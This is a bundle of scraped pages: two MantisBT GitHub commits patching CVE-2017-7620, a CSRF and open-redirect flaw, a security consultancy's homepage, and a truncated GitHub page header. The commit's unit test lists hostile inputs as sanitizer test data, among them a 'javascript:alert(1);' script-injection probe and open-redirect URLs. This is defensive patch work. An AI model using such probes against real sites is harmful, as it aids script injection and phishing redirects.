* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/f66440902877103f312905257dbccdad02ab5a3b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Encode '\' in string\_sanitize\_url()

[Browse files](/mantisbt/mantisbt/tree/f66440902877103f312905257dbccdad02ab5a3b)
Browse the repository at this point in the history

```
As an extra safety measure following up on the fix for [CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620"), we
encode the backslashes in the 'script' part of the URL to ensure that
the sanitized URL is treated as a path relative to MantisBT root and not
a link to an external site if the URL begins with an escaped `/`.

This reduces the risk of someone being able to use the same attack
vector in another page.

Fixes #22702, #22816
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 20, 2017

1 parent
[f21b56f](/mantisbt/mantisbt/commit/f21b56fa9060dbae9438b0d0dfb21dff090c1dd2)

commit f664409

Showing
**1 changed file**
with
**3 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[core/string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4 "core/string_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/f66440902877103f312905257dbccdad02ab5a3b/core/string_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,7 +275,9 @@ function string\_sanitize\_url( $p\_url, $p\_return\_absolute = false ) { |
|  |  | } |
|  |  |  |
|  |  | # Start extracting regex matches |
|  |  | $t\_script = $t\_matches['script']; |
|  |  | # Encode backslashes to prevent unwanted escaping of a leading '/' allowing |
|  |  | # redirection to external sites |
|  |  | $t\_script = strtr( $t\_matches['script'], array( '\\' => '%5C' ) ); |
|  |  | $t\_script\_path = $t\_matches['path']; |
|  |  |  |
|  |  | # Clean/encode query params |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f664409`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2Ff66440902877103f312905257dbccdad02ab5a3b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d1597fd4_20250126_031525.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  80](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

## Commit

[Permalink](/mantisbt/mantisbt/commit/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix CSRF vulnerability in permalink\_page.php

[Browse files](/mantisbt/mantisbt/tree/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0)
Browse the repository at this point in the history

```
John Page aka hyp3rlinx / ApparitionSec <http://hyp3rlinx.altervista.org>
reported a CSRF vulnerability in permalink_page.php, allowing an
attacker to inject arbitrary links ([CVE-2017-7620](https://github.com/advisories/GHSA-9x76-mp7r-2xc5 "CVE-2017-7620")).

Backporting from master branch:
- Add form security token to prevent such injection
  0d11077d40c5dfdb76efdad9ba2b455af5be25a0
- Encode '\' in string_sanitize_url()
  7b23377c573817c5fe8b522e8c33de8b1caff179

Fixes #22702, #22816
```

* Loading branch information

[![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)

[dregad](/mantisbt/mantisbt/commits?author=dregad "View all commits by dregad")
committed
May 19, 2017

1 parent
[a64a0d2](/mantisbt/mantisbt/commit/a64a0d220a44ec7d26fce77154f7ee2a62337a95)

commit 2d2309a

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**12 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* core

  + core/filter\_api.php
    [filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21)
  + core/string\_api.php
    [string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4)
* permalink\_page.php
  [permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95)
* tests/Mantis

  + tests/Mantis/StringTest.php
    [StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a)

## There are no files selected for viewing

5 changes: 4 additions & 1 deletion

5
[core/filter\_api.php](#diff-184c543668cedb4bce5a49727bb356c783df1b51e6bb8a7c2e55047650fbdb21 "core/filter_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/filter_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2451,8 +2451,11 @@ function filter\_draw\_selection\_area2( $p\_page\_number, $p\_for\_screen = true, $p\_e |
|  |  | filter\_print\_view\_type\_toggle( $t\_url, $t\_filter['\_view\_type'] ); |
|  |  |  |
|  |  | if( access\_has\_project\_level( config\_get( 'create\_permalink\_threshold' ) ) ) { |
|  |  | # Add CSRF protection, see #22702 |
|  |  | $t\_permalink\_url = urlencode( filter\_get\_url( $t\_filter ) ) |
|  |  | . form\_security\_param( 'permalink' ); |
|  |  | echo '<li>'; |
|  |  | echo '<a href="permalink\_page.php?url=' . urlencode( filter\_get\_url( $t\_filter ) ) . '">'; |
|  |  | echo '<a href="permalink\_page.php?url=' . $t\_permalink\_url . '">'; |
|  |  | echo '<i class="ace-icon fa fa-link"></i>&#160;&#160;' . lang\_get( 'create\_filter\_link' ); |
|  |  | echo '</a>'; |
|  |  | echo '</li>'; |
| Expand Down | |  |

4 changes: 3 additions & 1 deletion

4
[core/string\_api.php](#diff-e8b6d7d95d93f7f63a37c713cc93be7a9426d5bfd629b9efc00f39cc4f0df0e4 "core/string_api.php")

Show comments

[View file](/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/core/string_api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -275,7 +275,9 @@ function string\_sanitize\_url( $p\_url, $p\_return\_absolute = false ) { |
|  |  | } |
|  |  |  |
|  |  | # Start extracting regex matches |
|  |  | $t\_script = $t\_matches['script']; |
|  |  | # Encode backslashes to prevent unwanted escaping of a leading '/' allowing |
|  |  | # redirection to external sites |
|  |  | $t\_script = strtr( $t\_matches['script'], array( '\\' => '%5C' ) ); |
|  |  | $t\_script\_path = $t\_matches['path']; |
|  |  |  |
|  |  | # Clean/encode query params |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[permalink\_page.php](#diff-41f8fbfcde979e6ee4cd5f9eaf18455ca3893de723aca695903c4d7b3fb34a95 "permalink_page.php")

Show comments

[View file](/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/permalink_page.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -36,13 +36,16 @@ |
|  |  | require\_once( 'core.php' ); |
|  |  | require\_api( 'access\_api.php' ); |
|  |  | require\_api( 'config\_api.php' ); |
|  |  | require\_api( 'form\_api.php' ); |
|  |  | require\_api( 'gpc\_api.php' ); |
|  |  | require\_api( 'html\_api.php' ); |
|  |  | require\_api( 'lang\_api.php' ); |
|  |  | require\_api( 'print\_api.php' ); |
|  |  | require\_api( 'string\_api.php' ); |
|  |  | require\_api( 'utility\_api.php' ); |
|  |  |  |
|  |  | form\_security\_validate( 'permalink' ); |
|  |  |  |
|  |  | layout\_page\_header(); |
|  |  |  |
|  |  | layout\_page\_begin(); |
| Expand Down  Expand Up | | @@ -75,4 +78,5 @@ |
|  |  | ?> |
|  |  | </div> |
|  |  | <?php |
|  |  | form\_security\_purge( 'permalink' ); |
|  |  | layout\_page\_end(); |

1 change: 1 addition & 0 deletions

1
[tests/Mantis/StringTest.php](#diff-7c3b1d224688ff4512e175b2c9e39583cce2734929b0dd853f17546b7bd8df4a "tests/Mantis/StringTest.php")

Show comments

[View file](/mantisbt/mantisbt/blob/2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0/tests/Mantis/StringTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -82,6 +82,7 @@ public function provider() { |
|  |  | array( 'plugin.php?page=Source/list&id=1#abc', 'plugin.php?page=Source%2Flist&id=1#abc'), |
|  |  | array( 'login\_page.php?return=http://google.com/', 'index.php'), |
|  |  | array( 'javascript:alert(1);', 'index.php'), |
|  |  | array( '\/csrf-22702', '%5C/csrf-22702' ), |
|  |  | ); |
|  |  |  |
|  |  | # @FIXME |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2d2309a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F2d2309a384bcd9d4b6d7d2928e8ded2c46d2d7b0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from seekurity.com_3e7f69c5_20250126_031541.html ===


* Phone: +52-55-8882-0001
* [Email: [email protected]](/cdn-cgi/l/email-protection#452c2b232a053620202e30372c313c6b262a28)

[![Seekurity Logo](/images/Seekurity-logo-horizontal-blanco.png)](index.html)

* [English](/)
  [EspaÃ±ol](/es)

* [Home](#wrapper)
* [Services](#services)* [Blog](/blog)* [Contact us](#contact)* [About](#about)* More
          [Privacy Policy](/privacy-policy.html)

Who are we?
# We're SeekurityYour Seek for Information & Cyber Security

[Contact us](#contact)

#### Break

Breaking things is the first stage in discovering weaknessess, we always "trust" but first we need to "verify", how? by breaking!.

#### Harden

We successfully broke it during the verification process? No problem, now it's our turn to harden it to make it stronger than ever.

#### Repeat

Repeating the previous process with different methodologies to ensure that neither us nor anyone else can break it in the future.

#### What else?

Security is never a mission to be accomplished, security is an endless process involves breaking, hardening, verifying and trusting.

1

---

Real-world attacking scenarios!

We offer real world attacking scenarios and adversary simulations that reflects whether your business is secure and can be trusted or it requires our security team's interaction to put their touches to achieve our one and only goal which is 'Hardening' your business and make it harder for hackers to gain unauthorized access to it.

2

---

Break and Harden

We love builders but sorry, we are breakers, breaking is what we love to do on a daily basis this is the reason why we are existing, we break in a way that makes it a perfect and a teachable moment for builders to discover where exactly they fail hence business owers will have the knowledge and a secure business because of our endless journey of breaking and hardening.

3

---

Escalate, Evaluate. Repeat!

Discovering a security issue is just the first step in a thousand miles road, We escalate whatever could be escalated to show the real impact and then we evaluate the risk of the discovered issues based on the impact that can be done to businesses through vulnerability assessment methodologies.

## Our Services

---

*![Penetration Testing](/images/iconos/penetration-testing-porto.png)*

[### Penetration Testing](services.html#Penetration-Testing)

*![Physical Penetration](/images/iconos/physical-penetration-testing-porto.png)*

[### Physical Penetration Testing](services.html#Testing)

*![Content Managment system](/images/iconos/content-managment-porto.png)*

[### Content Management Systems Security Hardening](services.html#Content-Management)

*![Vulnerability](/images/iconos/vulnerability-porto.png)*

[### Vulnerability Assessments](services.html#Vulnerability)

*![Security Researches](/images/iconos/security-researches-porto.png)*

[### Security Researches](services.html#Security-Researches)

*![Malware analysis](/images/iconos/malware-analysis-porto.png)*

[### Malware analysis](services.html#Malware-analysis)

*![ Data & Information Security](/images/iconos/data-information-porto.png)*

[### Data & Information Security privacy and compliance](services.html#Data)

*![](/images/iconos/incident-porto.png)*

[### Incident Management](services.html#Incident-Management)

*![Risk Managment](/images/iconos/risk-management-porto.png)*

[### Risk Management](services.html#Risk-Management)

*![Open Source Intelligence](/images/iconos/open-source-intelligence-porto.png)*

[### Open-Source Intelligence (OSINT)](services.html#Open-Source)

*![Phishing analysis](/images/iconos/phishing-analysis-porto.png)*

[### Phishing analysis](services.html#Phishing-Analysis)

*![Anti-Fraud Solutions](/images/iconos/anti-fraud-solutions-porto.png)*

[### Anti-Fraud Solutions](services.html#Anti-Fraud)

*![Social Engineerring](/images/iconos/social-engineering-engagements-porto.png)*

[### Social Engineering engagements](services.html#Social-Engineering)

*![Cyber security](/images/iconos/cyber-security-monitoring-porto.png)*

[### Cyber Security Monitoring](services.html#Cyber-Security)

*![VoIP Security](/images/iconos/VoIP-security-solutions-porto.png)*

[### VoIP Security and Solutions](services.html#VoIP-Security)

*![Internet of things](/images/iconos/internet-things-porto.png)*

[### Internet of Things (IoT)](services.html#Internet)

*![Proudly Supporting FLOSS](/images/iconos/proudly-supporting-porto.png)*

[### Proudly Supporting FLOSS](services.html#Proudly-Supporting)

[See all](services.html)

## Attacks will never stop, Get ready to stand out!

We worked closely with tech giants to mitigate severe attacks which could have affected the privacy and security of billions of users around the world. Attacks will never stop, Get ready to stand out!

 1

ATTACKS WE MITIGATED

## Tech giants we proudly helped

---

 We proudly helped and worked closely with security teams from companies and big tech giants all over the world to ethically and responsibly address security vulnerabilities that may affect billions of users under their own responsible disclosure rules.

* ![Google Seekurity](/images/clients/google_c.png)
* ![facebook seekurity](/images/clients/facebook_c.png)
* ![Microsoft seekurity](/images/clients/microsoft_c.png)
* ![Twitter seekurity](/images/clients/twitter_c.png)
* ![Ebay seekurity](/images/clients/ebay_c.png)
* ![Alibaba seekurity](/images/clients/alibaba_c.png)
* ![Wordpress seekurity](/images/clients/wordpress_c.png)
* ![Samsung seekurity](/images/clients/samsung_c.png)
* ![Apple seekurity](/images/clients/apple_c.png)
* ![Sony seekurity](/images/clients/sony_c.png)
* ![Nokia seekurity](/images/clients/nokia_c.png)
* ![T-Mobil seekurity](/images/clients/tmobile_c.png)
* ![AT&T seekurity](/images/clients/at&t_c.png)
* ![Adobe seekurity](/images/clients/adobe_c.png)
* ![SoundCloud seekurity](/images/clients/soundcloud_c.png)

* ![Vodafone seekurity](/images/clients/vodafone_c.png)
* ![Yahoo seekurity](/images/clients/yahoo_c.png)
* ![Opera seekurity](/images/clients/opera_c.png)
* ![Sourceforge seekurity](/images/clients/sourceforge_c.png)
* ![Mikrotik seekurity](/images/clients/mikrotik_c.png)
* ![Uber seekurity](/images/clients/uber_c.png)
* ![Openkm seekurity](/images/clients/openkm_c.png)
* ![Rapid seekurity](/images/clients/rapid7_c.png)
* ![Freelancer seekurity](/images/clients/freelancer_c.png)
* ![Foursquare seekurity](/images/clients/foursquare_c.png)
* ![Vimeo seekurity](/images/clients/vimeo_c.png)
* ![Eventbrite seekurity](/images/clients/eventbrite_c.png)
* ![Netflix seekurity](/images/clients/netflix_c.png)
* ![Airbnb seekurity](/images/clients/airbnb_c.png)
* ![Hootsuite seekurity](/images/clients/hootsuite_c.png)

* ![Eset seekurity](/images/clients/eset_c.png)
* ![Avira seekurity](/images/clients/avira_c.png)
* ![Avira seekurity](/images/clients/bitdefender_c.png)
* ![Kaspersky seekurity](/images/clients/kaspersky_c.png)
* ![AVG seekurity](/images/clients/avg_c.png)

## About Seekurity

---

**Who are we?**

Seekurity is a Mexican consulting company, provider of services and solutions in Information security and cybersecurity. Focused on startups, medium and corporate companies, government, civil organizations, individuals, etc.
In addition to the information mentioned above, Seekurity has discovered several Common Vulnerabilities and Exposures (CVE) in different technologies and industries, including vulnerabilities in commercial security tools. These CVE numbers are being issued by the National Vulnerability Database (NVD), which is the repository of the US government of standards-based vulnerability management data represented by the Security Content Automation Protocol (SCAP).

**What we offer?**

As we believe that CVEs and the aforementioned discoveries are not enough in a world full of risks, Our team has more than 20 years of experience in the information security and cybersecurity sector, We classify the services in such a way that it is easier to identify the need of the contracting company at the beginning of the project. We are offering various consulting services and products, some can be offered on-site and others can be offered off-site. Read more [here.](#services)

**Our Mission**

Inspire and guide in the generation of safe mechanisms and processes for information systems, generating internal and external awareness about the importance of security, as well as the need to protect all assets that interact directly or indirectly with the information they own or protect. company unacceptable risks.

**Our Vision**

**Business perspective**: Maximize the placement of information security and cybersecurity consulting services with the generation of strategic indicators and aligned with the business objectives, such as: Savings on expenses and added values.

**Staff perspective**: Inspire staff with constant training making knowledge their best tool in dealing with the problems and needs of the sector.

**Information perspective**: Use the information as a tool that allows us to direct the business towards the fulfillment of our mission as a company.

**Application perspective**: Consider that applications are the engine for measuring the effectiveness or efficiency of our processes and activities.

**Infrastructure perspective**: Use as a fuel for the fulfillment of the objectives, a safe infrastructure, mitigating the potential risks for the business.

## Seekurity in the news

---

We have been mentioned in various Arabic, English and Spanish news due to our contributions and achievements of making the world a safer place. Get to know us:

[Arabic](https://skty.cc/arnews)

---

[![](/images/esnews.png)](https://skty.cc/arnews)

[English](https://skty.cc/ennews)

---

[![](/images/esnews.png)](https://skty.cc/ennews)

[Spanish](https://skty.cc/esnews)

---

[![](/images/esnews.png)](https://skty.cc/esnews)

## Visit us

---

We will show you how passionate we are about what we do, we will also show you technologies and attacks you might never saw before, in general, you won't regret the visit!

## Contact us

---

#### Notes

Make sure your request is clear, the more information you include the more you help our team to know exactly what you want.

Contact Information:

- Email: [[email protected]](/cdn-cgi/l/email-protection#b7fed9d1d8f7e4d2d2dcc2c5dec3ce99d4d8da)

- Emergencies Email: [[email protected]](/cdn-cgi/l/email-protection#e3dad2d2a3b086868896918a979acd808c8e)

- Phone: +52-55-8882-0001

- Blog: [blog](/blog)

- LinkedIn: <https://www.linkedin.com/company/Seekurity>

- Facebook: <https://www.facebook.com/Seekurity>

- Twitter: <https://twitter.com/Seekurity>

- Brochure (EN): </services/goto/2m>

- Brochure (ES ): </services/goto/2l>

- More Technical Details (EN): </services/goto/6o>

---

#### Business Hours

**Monday - Friday**

10 AM to 6 PM

**Saturdays**

Closed

**Sundays**

Closed

Name

Email

Interest in
Select services
Red-Team, Offensive and Adversary Simulations:
Black-box Penetration Testing & Vulnerability Assessment (Web, Mobile, Desktop, Thick-Client)
White-box Penetration Testing & Vulnerability Assessment (Web, Mobile, Desktop, Thick-Client)
API Security Penetration Testing & Vulnerability Assessment
Source Code Auditing
Network Segmentation and Firewall Security Penetration Testing
Wireless Network Penetration Testing & Vulnerability Assessment
IoT and Home Automation Security Penetration Testing & Vulnerability Assessment
Radio Spectrum Security Penetration Testing (NFC, RFID, WiFi, Bluetooth, 2.4 and 5 GHz Comms)
Physical Penetrations Testing
Intelligence Penetration Testing
Management of Bug Bounty Programs
Coordinated Adversary Simulations
Phishing and Social Engineering Simulations

Blue-Team, Defense and Research:
Data Privacy
Incident Response
Incident Management
Security Monitoring
ISO 27001 Audits and Implementations
End-Point Mobile Security (Corporate and Personal)
End-Point Computer Security (Corporate and Personal)
Investigation (Phishing Analysis, Fraud, extortion, etc...)
Security Governance and Compliance with local laws (ISO, PCI/DSS, HIPAA, GDPR, Mexico Personal Data, etc...)
Security Evaluation and Implementations (Network monitoring and analysis, IDS, IPS, VPN, Endpoint security, antivirus, etc...)

Other

Comments

Send Message

#### SEEKURITY - INFORMATION SECURITY AND CYBERSECURITY FIRM

* 4th Floor, Hamburgo 182

  Juarez 06600, Mexico City, Mexico
* +52-55-8882-0001
* [[email protected]](/cdn-cgi/l/email-protection#3f565159507f4c5a5a544a4d564b46115c5052)
* Monday - Friday: **10:00 - 18:00**

  Saturday & Sunday: **Closed**

![](/images/assets/map.png)

####

![](/images/logos/logo_footer.png)

Â©2021 Seekurity - Information Security & Cyber Security
Firm SA de C.V. All Rights Reserved. [- Privacy Policy](privacy-policy.html)



=== Content from github.com_e6357f38_20250126_031503.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F241ff4eb4faca162e57faf8d317d5fc1c0fa4d62)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F241ff4eb4faca162e57faf8d317d5fc1c0fa4d62)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

